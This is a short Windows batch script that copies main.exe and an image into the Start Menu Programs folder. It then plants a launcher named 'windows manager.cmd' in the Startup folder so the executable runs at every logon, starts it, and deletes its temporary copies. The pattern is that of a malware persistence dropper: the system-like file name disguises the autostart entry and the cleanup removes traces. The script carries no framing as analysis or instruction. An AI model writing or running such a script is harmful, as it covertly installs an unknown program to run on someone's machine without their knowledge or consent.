COPY img.png %TEMP%
COPY main.exe %TEMP%
C:
cd %AppData%\Microsoft\Windows\Start Menu\Programs
COPY %TEMP%\img.png
COPY %TEMP%\main.exe
cd Startup
echo ^cd "%AppData%\Microsoft\Windows\Start Menu\Programs" ^&^& ^Start ^main^.^exe > "windows manager.cmd"
"windows manager.cmd"
cd %TEMP%
DEL img.png
DEL main.exe                                 
